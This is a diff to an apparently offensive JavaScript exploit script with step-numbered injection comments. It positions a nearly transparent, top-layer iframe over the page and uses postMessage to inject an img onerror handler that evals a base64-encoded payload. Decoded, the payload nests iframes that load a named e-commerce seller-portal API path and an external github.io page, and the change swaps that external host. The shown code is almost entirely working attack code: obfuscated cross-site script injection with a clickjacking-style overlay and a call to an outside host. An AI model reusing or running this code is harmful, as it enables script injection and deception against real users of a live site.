@@ -537,8 +537,9 @@
         iframe.style.height = height + 'px';
         iframe.style.position = 'absolute';
         iframe.style.zIndex = '9999';
-        iframe.style.left = '-90px';
-        iframe.style.top = '20px';
+        iframe.style.left = '400px';
+        iframe.style.top='-270px'
+
 
         // Opacity for debugging
         iframe.style.opacity = '0.09';
@@ -604,7 +605,7 @@
 
           // STEP 3: First injection (nested iframes)
           iframe.contentWindow.postMessage(
-            'document.write("<img src=x onerror=eval(atob(\'Y29uc3QgZD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTtkLmlubmVySFRNTD0nPGlmcmFtZSBzcmM9Imh0dHBzOi8vYWdlbnRzZWxsZXIudGVtdS5jb20vYXBpL3NlcnZlci9fc3RtIiB3aWR0aD0iNTAwIiBoZWlnaHQ9IjUwMCI+PC9pZnJhbWU+Jztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGQpO2QucXVlcnlTZWxlY3RvcigiaWZyYW1lIikub25sb2FkPWZ1bmN0aW9uKCl7dHJ5e2NvbnN0IGY9dGhpcy5jb250ZW50V2luZG93LmRvY3VtZW50LG49Zi5jcmVhdGVFbGVtZW50KCJkaXYiKTtuLmlubmVySFRNTD0nPGlmcmFtZSBzcmM9Imh0dHBzOi8vZGFzZHNhMGQ4czlhLmdpdGh1Yi5pby9kc2Fkc2Fkc2Fkc2FkYXNkc2Evbm9uLmh0bWwiIHdpZHRoPSI1MDAiIGhlaWdodD0iNTAwIj48L2lmcmFtZT4nO2YuYm9keS5hcHBlbmRDaGlsZChuKX1jYXRjaChlKXtjb25zb2xlLmVycm9yKCJBY2Nlc3MgZGVuaWVkOiBDcm9zcy1vcmlnaW4gcmVzdHJpY3Rpb24iKX19Ow==\'))>")',
+            'document.write("<img src=x onerror=eval(atob(\'Y29uc3QgZD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTtkLmlubmVySFRNTD0nPGlmcmFtZSBzcmM9Imh0dHBzOi8vYWdlbnRzZWxsZXIudGVtdS5jb20vYXBpL3NlcnZlci9fc3RtIiB3aWR0aD0iNTAwIiBoZWlnaHQ9IjUwMCI+PC9pZnJhbWU+Jztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGQpO2QucXVlcnlTZWxlY3RvcigiaWZyYW1lIikub25sb2FkPWZ1bmN0aW9uKCl7dHJ5e2NvbnN0IGY9dGhpcy5jb250ZW50V2luZG93LmRvY3VtZW50LG49Zi5jcmVhdGVFbGVtZW50KCJkaXYiKTtuLmlubmVySFRNTD0nPGlmcmFtZSBzcmM9Imh0dHBzOi8vbmpyd2VocnR1amlrd3E4OTc4OS5naXRodWIuaW8vZHNhbzhkN3NhOWQ3OHNhOWRzYS9ub2UuaHRtbCIgd2lkdGg9IjUwMCIgaGVpZ2h0PSI1MDAiPjwvaWZyYW1lPic7Zi5ib2R5LmFwcGVuZENoaWxkKG4pfWNhdGNoKGUpe2NvbnNvbGUuZXJyb3IoIkFjY2VzcyBkZW5pZWQ6IENyb3NzLW9yaWdpbiByZXN0cmljdGlvbiIpfX07\'))>")',
             '*'
           );
           console.log('[+] Injection 1 sent');
